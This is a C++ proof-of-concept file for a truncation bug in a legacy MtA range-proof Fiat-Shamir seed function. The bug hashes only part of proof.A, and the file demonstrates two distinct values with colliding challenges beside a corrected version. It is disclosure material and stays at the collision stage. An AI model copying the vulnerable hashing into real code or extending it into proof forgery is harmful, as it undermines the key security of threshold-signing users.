/**
 * PoC: Legacy MTA Fiat-Shamir Seed Truncation Bug
 * 
 * Demonstrates that generate_mta_range_zkp_seed() in mta.cpp uses
 * BN_num_bytes(proof.S) as the length when hashing proof.A, instead of
 * BN_num_bytes(proof.A). This means only the first ~128 bytes of A's
 * ~512-byte representation are included in the Fiat-Shamir challenge,
 * allowing two distinct A values to produce identical challenges.
 *
 * Build:
 *   g++ -std=c++17 -O2 poc.cpp -o poc -lcrypto
 *
 * No special flags needed for this PoC since it demonstrates a logic bug,
 * not a memory layout issue.
 */

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>
#include <openssl/bn.h>
#include <openssl/sha.h>
#include <openssl/rand.h>

static const char MTA_ZKP_SALT[] = "Affine Operation with Group Commitment in Range ZK";

/**
 * Simulates the sizes we would see in a real CMP protocol execution:
 *   - Verifier Paillier key: 2048-bit => paillier_pub_n_size = 256 bytes
 *   - proof.A size = 2 * paillier_pub_n_size = 512 bytes
 *   - Ring Pedersen modulus: 1024-bit => ring_pedersen_n_size = 128 bytes
 *   - proof.S size = ring_pedersen_n_size = 128 bytes
 *
 * The bug: SHA256_Update(&ctx, n.data(), BN_num_bytes(proof.S))
 * This hashes only 128 bytes of A's 512-byte big-endian representation.
 */

/* Simulate realistic key sizes */
static const int PAILLIER_N_BITS = 2048;
static const int RING_PEDERSEN_N_BITS = 1024;

/**
 * Reproduce the vulnerable generate_mta_range_zkp_seed logic.
 * This is a faithful copy of the legacy path from mta.cpp lines 115-150.
 */
static void vulnerable_generate_seed(const BIGNUM* A, const BIGNUM* S,
                                      const BIGNUM* By, const BIGNUM* E,
                                      const BIGNUM* F, const BIGNUM* T,
                                      const uint8_t* Bx, size_t Bx_len,
                                      const std::vector<uint8_t>& aad,
                                      const std::vector<uint8_t>& message,
                                      const std::vector<uint8_t>& commitment,
                                      uint8_t* seed)
{
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, MTA_ZKP_SALT, sizeof(MTA_ZKP_SALT));
    SHA256_Update(&ctx, aad.data(), aad.size());
    SHA256_Update(&ctx, message.data(), message.size());
    SHA256_Update(&ctx, commitment.data(), commitment.size());

    /* THE BUG: allocates BN_num_bytes(A) for the buffer, but only hashes
     * BN_num_bytes(S) bytes into the SHA256 context. */
    std::vector<uint8_t> n(BN_num_bytes(A));
    BN_bn2bin(A, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(S));  // BUG: uses S's size for A

    SHA256_Update(&ctx, Bx, Bx_len);

    n.resize(BN_num_bytes(By));
    BN_bn2bin(By, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(By));

    n.resize(BN_num_bytes(E));
    BN_bn2bin(E, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(E));

    n.resize(BN_num_bytes(F));
    BN_bn2bin(F, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(F));

    n.resize(BN_num_bytes(S));
    BN_bn2bin(S, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(S));

    n.resize(BN_num_bytes(T));
    BN_bn2bin(T, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(T));

    SHA256_Final(seed, &ctx);
}

/**
 * The CORRECT implementation (extended seed path) would hash ALL of A:
 */
static void correct_generate_seed(const BIGNUM* A, const BIGNUM* S,
                                   const BIGNUM* By, const BIGNUM* E,
                                   const BIGNUM* F, const BIGNUM* T,
                                   const uint8_t* Bx, size_t Bx_len,
                                   const std::vector<uint8_t>& aad,
                                   const std::vector<uint8_t>& message,
                                   const std::vector<uint8_t>& commitment,
                                   uint8_t* seed)
{
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, MTA_ZKP_SALT, sizeof(MTA_ZKP_SALT));
    SHA256_Update(&ctx, aad.data(), aad.size());
    SHA256_Update(&ctx, message.data(), message.size());
    SHA256_Update(&ctx, commitment.data(), commitment.size());

    /* FIXED: hash the full A value */
    std::vector<uint8_t> n(BN_num_bytes(A));
    BN_bn2bin(A, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(A));  // CORRECT: uses A's size

    SHA256_Update(&ctx, Bx, Bx_len);

    n.resize(BN_num_bytes(By));
    BN_bn2bin(By, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(By));

    n.resize(BN_num_bytes(E));
    BN_bn2bin(E, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(E));

    n.resize(BN_num_bytes(F));
    BN_bn2bin(F, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(F));

    n.resize(BN_num_bytes(S));
    BN_bn2bin(S, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(S));

    n.resize(BN_num_bytes(T));
    BN_bn2bin(T, n.data());
    SHA256_Update(&ctx, n.data(), BN_num_bytes(T));

    SHA256_Final(seed, &ctx);
}

static void print_hex(const char* label, const uint8_t* data, size_t len)
{
    printf("%s", label);
    for (size_t i = 0; i < len; i++) printf("%02x", data[i]);
    printf("\n");
}

int main()
{
    printf("=== PoC: Legacy MTA Fiat-Shamir Seed Truncation ===\n\n");

    /* Generate realistic-sized BIGNUM values */
    BIGNUM* A1 = BN_new();  /* proof.A - first version */
    BIGNUM* A2 = BN_new();  /* proof.A - second version (differs only in high bytes) */
    BIGNUM* S = BN_new();   /* proof.S - ring pedersen size */
    BIGNUM* By = BN_new();
    BIGNUM* E = BN_new();
    BIGNUM* F = BN_new();
    BIGNUM* T = BN_new();

    /* Generate S with ring_pedersen_n_size bits (1024-bit, ~128 bytes) */
    BN_rand(S, RING_PEDERSEN_N_BITS, BN_RAND_TOP_ONE, 0);

    /* Generate A1 with paillier size * 2 bits (4096-bit, ~512 bytes) */
    BN_rand(A1, PAILLIER_N_BITS * 2, BN_RAND_TOP_ONE, 0);

    /* Create A2: identical to A1 in the first BN_num_bytes(S) bytes,
     * but different in the remaining bytes.
     * 
     * BN_bn2bin produces big-endian output. The SHA256_Update call
     * only consumes the first BN_num_bytes(S) bytes of this output.
     * So we construct A2 to share those leading bytes with A1 but
     * differ in the trailing bytes (which are never hashed). */
    int a_size = BN_num_bytes(A1);
    int s_size = BN_num_bytes(S);

    printf("[*] proof.A size: %d bytes (%d bits)\n", a_size, BN_num_bits(A1));
    printf("[*] proof.S size: %d bytes (%d bits)\n", s_size, BN_num_bits(S));
    printf("[*] Bytes of A hashed into challenge: %d (only %.1f%%)\n",
           s_size, 100.0 * s_size / a_size);
    printf("[*] Bytes of A IGNORED by challenge:  %d\n\n", a_size - s_size);

    /* Extract A1's binary representation */
    std::vector<uint8_t> a1_bin(a_size);
    BN_bn2bin(A1, a1_bin.data());

    /* Create A2: same first s_size bytes, random remaining bytes */
    std::vector<uint8_t> a2_bin(a_size);
    memcpy(a2_bin.data(), a1_bin.data(), s_size);  /* identical prefix */
    RAND_bytes(a2_bin.data() + s_size, a_size - s_size);  /* random suffix */

    /* Make sure A2 is actually different from A1 */
    a2_bin[a_size - 1] ^= 0x01;  /* flip a bit in the ignored region */

    BN_bin2bn(a2_bin.data(), a_size, A2);

    /* Verify A1 != A2 */
    if (BN_cmp(A1, A2) == 0) {
        printf("[!] ERROR: A1 and A2 are identical. This should not happen.\n");
        return 1;
    }
    printf("[+] Confirmed: A1 != A2 (they differ in bytes %d..%d)\n\n", s_size, a_size - 1);

    /* Generate other proof components (same for both) */
    BN_rand(By, PAILLIER_N_BITS * 2, BN_RAND_TOP_ONE, 0);
    BN_rand(E, RING_PEDERSEN_N_BITS, BN_RAND_TOP_ONE, 0);
    BN_rand(F, RING_PEDERSEN_N_BITS, BN_RAND_TOP_ONE, 0);
    BN_rand(T, RING_PEDERSEN_N_BITS, BN_RAND_TOP_ONE, 0);

    uint8_t Bx[33];  /* elliptic_curve256_point_t is 33 bytes */
    RAND_bytes(Bx, sizeof(Bx));

    std::vector<uint8_t> aad = {0x01, 0x02, 0x03, 0x04};
    std::vector<uint8_t> message(256);
    std::vector<uint8_t> commitment(256);
    RAND_bytes(message.data(), message.size());
    RAND_bytes(commitment.data(), commitment.size());

    /* Compute seeds using the VULNERABLE function */
    uint8_t seed1[32], seed2[32];
    vulnerable_generate_seed(A1, S, By, E, F, T, Bx, sizeof(Bx),
                              aad, message, commitment, seed1);
    vulnerable_generate_seed(A2, S, By, E, F, T, Bx, sizeof(Bx),
                              aad, message, commitment, seed2);

    printf("--- Vulnerable (legacy) seed generation ---\n");
    print_hex("[*] Seed with A1: ", seed1, 32);
    print_hex("[*] Seed with A2: ", seed2, 32);

    if (memcmp(seed1, seed2, 32) == 0) {
        printf("\n[!] COLLISION: Both A values produce IDENTICAL Fiat-Shamir seeds!\n");
        printf("[!] This means the challenge e = H(seed) is the same for both.\n");
        printf("[!] An attacker can substitute A2 for A1 without changing the challenge.\n");
    } else {
        printf("\n[?] Seeds differ (unexpected). Check BIGNUM encoding.\n");
    }

    /* Now show that the CORRECT implementation distinguishes them */
    uint8_t correct_seed1[32], correct_seed2[32];
    correct_generate_seed(A1, S, By, E, F, T, Bx, sizeof(Bx),
                           aad, message, commitment, correct_seed1);
    correct_generate_seed(A2, S, By, E, F, T, Bx, sizeof(Bx),
                           aad, message, commitment, correct_seed2);

    printf("\n--- Correct (extended) seed generation ---\n");
    print_hex("[*] Seed with A1: ", correct_seed1, 32);
    print_hex("[*] Seed with A2: ", correct_seed2, 32);

    if (memcmp(correct_seed1, correct_seed2, 32) != 0) {
        printf("\n[+] CORRECT: Different A values produce different seeds.\n");
        printf("[+] The extended seed path (MPC_PROTOCOL_VERSION >= 11) is not affected.\n");
    } else {
        printf("\n[?] Seeds match even with full hashing (unexpected).\n");
    }

    printf("\n=== Analysis ===\n");
    printf("The legacy generate_mta_range_zkp_seed() hashes only %d of %d bytes of proof.A.\n",
           s_size, a_size);
    printf("This is because line 130 of mta.cpp uses BN_num_bytes(proof.S) as the length\n");
    printf("parameter for the SHA256_Update call that should hash proof.A.\n\n");
    printf("In the CMP protocol context:\n");
    printf("  - proof.A is ~%d bytes (2 * verifier Paillier N size)\n", a_size);
    printf("  - proof.S is ~%d bytes (ring Pedersen N size)\n", s_size);
    printf("  - Only %.1f%% of proof.A contributes to the Fiat-Shamir challenge\n",
           100.0 * s_size / a_size);
    printf("\nThis breaks the binding property of the Fiat-Shamir transform for proof.A.\n");

    /* Cleanup */
    BN_free(A1);
    BN_free(A2);
    BN_free(S);
    BN_free(By);
    BN_free(E);
    BN_free(F);
    BN_free(T);

    return 0;
}
